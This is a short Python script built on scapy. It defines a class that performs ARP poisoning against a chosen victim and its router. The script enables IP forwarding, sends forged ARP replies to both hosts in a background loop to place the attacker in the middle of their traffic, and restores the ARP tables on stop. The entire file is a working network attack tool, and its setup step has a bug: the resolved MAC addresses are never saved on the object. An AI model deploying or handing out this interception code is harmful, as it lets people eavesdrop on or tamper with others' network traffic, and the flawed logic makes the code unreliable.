#! /usr/bin/env python3.6
"""Arp posoining object"""

from scapy.all import arping, Ether, send, ARP
from threading import Thread
import sys
import logging
import time


def originalMAC(ip):
    ans, unans = arping(ip)
    for s, r in ans:
        return r[Ether].src


class Arp:

    def __init__(self, router, victim):
        self.router = router
        self.victim = victim
        self.router_mac = None
        self.victim_mac = None
        self.run = False

    def setup(self):
        logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
        router_mac = originalMAC(self.router)
        victim_mac = originalMAC(self.victim)
        if not router_mac:
            sys.exit("Could not find router MAC address. Closing....")
        if not victim_mac:
            sys.exit("Could not find victim MAC address. Closing....")
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
            ipf.write('1\n')

    def restore(self):
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
            ipf.write('0\n')
        send(ARP(op=2, pdst=self.router, psrc=self.victim,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victim_mac),
             count=3, verbose=False)
        send(ARP(op=2, pdst=self.victim, psrc=self.router,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.router_mac),
             count=3, verbose=False)

    def poison(self):
        while self.run:
            send(ARP(op=2, pdst=self.victim, psrc=self.router,
                 hwdst=self.victim_mac), verbose=False)
            send(ARP(op=2, pdst=self.router, psrc=self.victim,
                 hwdst=self.router_mac), verbose=False)
            time.sleep(1.5)

    def start(self):
        self.run = True
        thread = Thread(target=self.poison)
        thread.start()
        print("Arp Poisoning Starting")

    def stop(self):
        self.run = False
        print("Stopping Arp Poisoning")
        self.restore()
        print("Restoring Arp Poisoning")
